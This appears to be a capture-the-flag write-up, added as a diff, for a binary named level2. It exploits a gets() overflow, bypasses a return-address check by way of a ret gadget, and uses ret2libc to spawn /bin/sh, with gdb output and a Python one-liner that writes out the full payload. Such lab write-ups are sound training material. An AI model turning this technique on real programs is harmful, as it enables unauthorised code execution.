@@ -1,0 +1,14 @@
+The program call gets that is vulnerable to segfault. We can overwrite the eip but the program make
+a cmp so that if our eip start by 0xb it call the exit function. A way to bypass this is to redirect the stream
+to the forward ret function wich start with 0x080.
+We can now use the ret2libc method to redirect the flow to "system /bin/sh" execution
+
+
+(gdb) p system
+0xb7e6b060
+(gdb) find 0xb7e6b060, +999999999, "/bin/sh"
+0xb7f8cc58
+
+$> python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x58\xcc\xf8\xb7"' > /tmp/exploit
+
+$> cat /tmp/exploit - | ./level2
